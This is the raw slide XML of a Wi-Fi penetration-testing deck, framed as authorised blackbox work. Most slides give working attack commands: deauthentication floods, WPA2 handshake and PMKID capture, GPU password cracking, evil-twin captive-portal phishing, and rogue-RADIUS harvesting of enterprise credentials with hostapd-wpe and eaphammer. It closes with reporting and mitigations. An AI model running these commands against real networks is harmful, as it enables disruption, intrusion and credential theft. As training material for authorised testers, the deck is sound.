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00D9B5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43434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12188952" cy="27432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D9B5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 ASSESSMENT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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Blackbox Wi-Fi Penetration Test</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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822960" y="43434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(PSK)  &amp;  WPA2/WPA3-Enterprise (802.1X)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•  Tooling  •  Commands  •  Reporting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scope &amp; blackbox rules of engagement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tool stack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Reconnaissance &amp; target enumeration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WPA2-Personal (PSK) attack chain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WPA2/WPA3-Enterprise (802.1X/EAP) attack chain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risk rating &amp; client-facing mitigations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188720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B5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Assumptions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0" y="182880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SSID / BSSID / creds given by client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physical proximity + off-the-shelf adapter assumed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via signed RoE with site &amp; time window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limited to client-owned SSIDs / BSSIDs only</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="125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8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Tool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B5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Adapter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154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AWUS036ACH / ACHM (RTL8812AU, monitor + injection)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AWUS036NHA (Atheros, rock-solid monitor mode)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51960" y="118872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B5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OS / Driver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3154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(rolling)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aircrack-ng driver patches / realtek drivers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18872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B5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Core suites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1828800"/>
            <a:ext cx="3154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aircrack-ng suite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hcxtools / hcxdumptool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airgeddon (all-in-one menu)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hostapd-wpe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eaphammer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Wifiphisher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/ John the Ripper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Kismet, Wireshark</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12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13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Reconnaissance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monitor mode and survey the RF spectrum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in-scope SSIDs/BSSIDs, channel, encryption type (WPA2-PSK vs WPA2/3-Enterprise), connected clients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hidden SSIDs and rogue/evil APs already present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client devices (probe requests) for later targeted attacks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Put adapter into monitor mode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airmon-ng check kill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airmon-ng start wlan0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survey of all APs/clients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airodump-ng wlan0mon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Focused capture on one channel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airodump-ng -c 6 --bssid &lt;BSSID&gt;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-w recon wlan0mon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Alternative / cross-check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kismet -c wlan0mon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wavemon</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="125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— 4-Way Handshake Capture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0D9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BSSID with associated clients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targeted deauth to force a client to reassociate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airodump-ng captures the 4-way EAPOL handshake to disk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handshake before moving to cracking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Capture on target channel/BSSID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airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt;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-w handshake wlan0mon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Deauth a connected client (new window)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aireplay-ng -0 5 -a &lt;BSSID&gt;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 &lt;CLIENT_MAC&gt; wlan0mon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handshake was captured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aircrack-ng handshake-01.cap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="125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— PMKID Attack (Clientless)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0D9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/ no deauth required — stealthier than handshake capture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against APs that send PMKID in the first EAPOL frame (common on consumer routers)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hcxdumptool grabs the PMKID; hcxpcapngtool converts to hashcat format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 PMKID from target AP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hcxdumptool -i wlan0mon -o pmkid.pcapng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--enable_status=1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capture to hashcat 22000 format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hcxpcapngtool -o pmkid.22000 pmkid.pcapng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Crack directly with hashcat (mode 22000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handles both PMKID and handshake)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22000 pmkid.22000 wordlist.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="125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— Offline Cracking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0D9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capture to hashcat format (.22000) or use aircrack-ng directly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attack first (rockyou, client-specific wordlists), then rules/mask for weak custom passphrases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cracking (hashcat) is far faster than CPU (aircrack-ng) for large wordlists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aircrack-ng (CPU, quick check)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aircrack-ng -w rockyou.txt -b &lt;BSSID&gt;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handshake-01.cap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hashcat (GPU, dictionary + rules)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cap2hccapx.py handshake-01.cap out.hccapx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22000 out.22000 rockyou.txt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-r rules/best64.rule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hashcat mask attack (pattern-based)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22000 out.22000 -a 3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?u?l?l?l?l?l?d?d</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="125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— Rogue AP / Evil Twin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0D9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passphrase resists cracking — social-engineer it instead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SSID, deauth clients off the real AP, lure them to the rogue twin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portal prompts for Wi-Fi password / firmware update — validated live against the real AP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airgeddon drives the whole chain (recon → deauth → evil twin → portal) from one menu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Automated evil-twin + captive portal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wifiphisher -e "&lt;TargetSSID&gt;"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firmware-upgrade --deauth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All-in-one menu-driven (recon, deauth,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handshake/PMKID, evil twin, portal)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airgeddon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Manual alternative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airbase-ng -e "&lt;TargetSSID&gt;" -c &lt;CH&gt;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wlan0mon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aireplay-ng -0 0 -a &lt;BSSID&gt; wlan0mon</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="120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WPA2/WPA3-Enterprise — Attack Surface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547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/ EAP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authenticate to RADIUS via EAP (PEAP-MSCHAPv2, EAP-TTLS, EAP-TLS)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is rarely the crypto — it's clients that don't validate the RADIUS server certificate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stand up a rogue AP/RADIUS, get a client to auth to it, harvest the exchange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EAP-TLS (mutual cert auth) is resistant to this — confirm which EAP method is in use first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0927080" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478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B5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Recon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EAP method via airodump-ng / Wireshark on beacon &amp; association frames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eapmd5pass / eaphammer --cull can fingerprint supported EAP types before attacking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10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WPA2-Enterprise — Evil Twin Credential Harvest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547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/ EAP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rogue AP broadcasting the same SSID as the real EAP network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hostapd-wpe acts as a rogue RADIUS: it accepts any EAP auth and logs the MSCHAPv2 challenge/response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victim's client doesn't validate the RADIUS cert, it hands over crackable creds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eaphammer is the modern alternative — handles GTC downgrade &amp; cert cloning automatically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airgeddon can also drive a rogue AP/Enterprise evil-twin flow from its menu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hostapd-wpe (edit hostapd-wpe.conf: ssid,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channel, interface first)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hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf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eaphammer — one-shot evil twin + rogue RADIUS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eaphammer -i wlan0 --channel &lt;CH&gt; \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--auth wpa-eap --essid "&lt;TargetSSID&gt;" \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--creds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airgeddon — menu-driven alternative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airgeddon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Force clients over with deauth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aireplay-ng -0 0 -a &lt;BSSID&gt; wlan0mon</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="115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WPA2-Enterprise — Cracking Captured Credentials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547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/ EAP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hostapd-wpe/eaphammer log MSCHAPv2 challenge + response per victim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asleap breaks MSCHAPv2 directly from a wordlist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mode 5500 (NetNTLM/MSCHAPv2) is the GPU-accelerated path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cracked password often equals valid domain/VPN credentials — flag as critical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200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A0E1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728216"/>
            <a:ext cx="506577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asleap (wordlist attack)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asleap -C &lt;challenge&gt; -R &lt;response&gt;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-W wordlist.txt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hashcat MSCHAPv2 (mode 5500)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5500 captured.txt wordlist.txt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Format: user:chal:resp (from hostapd-wpe log)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Validate hit against live auth before reporting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9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Risk Rating &amp; Mitigations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B5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Findings to document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SSID/BSSID, location, signal strength, encryption type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 used (handshake / PMKID / evil twin) and time-to-compromise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passphrase or harvested domain creds (redacted in report body)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if creds are domain/VPN-linked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18872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121A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B5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Recommended mitigations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WPA3-SAE where hardware supports it; WPA2 min. 14+ char random passphrase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enforce EAP-TLS or require server-cert validation on all clients (MDM-pushed config)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PMKID-vulnerable roaming features where not needed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AP / wireless IDS monitoring (WIPS)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guest/BYOD Wi-Fi from corporate VLANs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="104" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9966960" y="256032"/>
            <a:ext cx="1920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10" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="105" type="body" hasCustomPrompt="1"/>
          </p:nvPr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Blackbox Wi-Fi: Recon → Capture → Crack / Harvest → Report</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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822960" y="43434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D1D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fiRedTeam">
  <a:themeElements>
    <a:clrScheme name="WifiRedTeam">
      <a:dk1>
        <a:srgbClr val="0B0F14"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="0E1621"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="0E1621"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="00D9B5"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="FF5470"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="FFD166"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="5B8DEF"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="C9D1D9"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="8B5CF6"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="00D9B5"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="8B5CF6"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="WifiRedTea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2026-10-11T17:35:54Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-11T17:35:54Z</dcterms:modified>
</cp:coreProperties>
</file>